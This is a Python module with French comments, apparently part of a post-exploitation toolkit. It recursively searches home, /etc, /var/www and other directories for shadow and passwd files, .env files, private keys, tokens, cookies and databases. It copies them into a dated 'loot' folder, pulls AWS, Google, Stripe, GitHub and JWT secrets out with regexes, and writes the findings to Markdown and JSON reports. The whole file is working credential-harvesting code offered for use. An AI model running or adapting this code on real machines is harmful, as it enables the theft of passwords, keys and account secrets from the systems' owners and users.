import os
import glob
import shutil
import datetime

def find_sensitive_files(search_dirs=None, patterns=None, max_files=50):
    """
    Recherche des fichiers sensibles (shadow, passwd, config, .env, .git, tokens, cookies, etc) dans les dossiers spécifiés.
    """
    if not search_dirs:
        search_dirs = [os.path.expanduser('~'), '/etc', '/var/www', '/tmp', '/home']
    if not patterns:
        patterns = [
            '*shadow*', '*passwd*', '*.env', '*.git*', '*.htpasswd', '*.htaccess',
            '*config*', '*wp-config.php', '*database*', '*secret*', '*credential*',
            '*token*', '*cookie*', '*.pem', '*.key', '*.crt', '*.pfx', '*.kdb*', '*.db',
            '*.sqlite', '*.bak', '*.zip', '*.rar', '*.7z', '*.tar', '*.gz', '*.log'
        ]
    found = []
    for d in search_dirs:
        for p in patterns:
            for f in glob.glob(os.path.join(d, '**', p), recursive=True):
                if os.path.isfile(f):
                    found.append(f)
                if len(found) >= max_files:
                    return found
    return found

def dump_files(file_list, output_dir):
    """
    Copie les fichiers trouvés dans un dossier de loot local pour analyse offline.
    """
    # Organisation : exports/<date>/loot/
    date_dir = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    base_dir = os.path.join(os.getcwd(), "exports", date_dir, "loot")
    os.makedirs(base_dir, exist_ok=True)
    dumped = []
    for f in file_list:
        try:
            dest = os.path.join(base_dir, os.path.basename(f))
            shutil.copy2(f, dest)
            dumped.append(dest)
        except Exception:
            continue
    return dumped

def extract_tokens_from_files(file_list):
    """
    Extrait des patterns de tokens/API keys/cookies des fichiers trouvés.
    """
    import re
    token_regexes = [
        r'AKIA[0-9A-Z]{16}', # AWS
        r'AIza[0-9A-Za-z\-_]{35}', # Google
        r'sk_live_[0-9a-zA-Z]{24,}', # Stripe
        r'ghp_[0-9a-zA-Z]{36,}', # GitHub
        r'(?:token|api[_-]?key)["\':= ]+([0-9a-zA-Z\-_]{16,})',
        r'eyJ[a-zA-Z0-9\-_]{20,}\.[a-zA-Z0-9\-_]{10,}\.[a-zA-Z0-9\-_]{10,}' # JWT
    ]
    found = []
    for f in file_list:
        try:
            with open(f, encoding='utf-8', errors='ignore') as fin:
                content = fin.read()
                for reg in token_regexes:
                    for m in re.findall(reg, content):
                        found.append({'file': f, 'token': m})
        except Exception:
            continue
    return found

def export_loot_report(files, tokens, output_base):
    """
    Exporte un rapport de loot (fichiers trouvés, tokens extraits).
    """
    # Organisation : exports/<date>/loot/
    date_dir = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    base_dir = os.path.join(os.getcwd(), "exports", date_dir, "loot")
    os.makedirs(base_dir, exist_ok=True)
    export_base = os.path.join(base_dir, os.path.basename(output_base))
    with open(export_base+'.md', 'w', encoding='utf-8') as f:
        f.write(f"# Rapport Loot automatique\n\n")
        f.write(f"**Date** : {datetime.datetime.now().isoformat()}\n\n")
        f.write(f"## Fichiers sensibles trouvés ({len(files)})\n\n")
        for file in files:
            f.write(f"- {file}\n")
        f.write(f"\n## Tokens/API Keys/Cookies extraits ({len(tokens)})\n\n")
        for t in tokens:
            f.write(f"- {t['file']} : `{t['token']}`\n")
    with open(export_base+'.json', 'w', encoding='utf-8') as f:
        import json
        json.dump({'files': files, 'tokens': tokens}, f, ensure_ascii=False, indent=2)
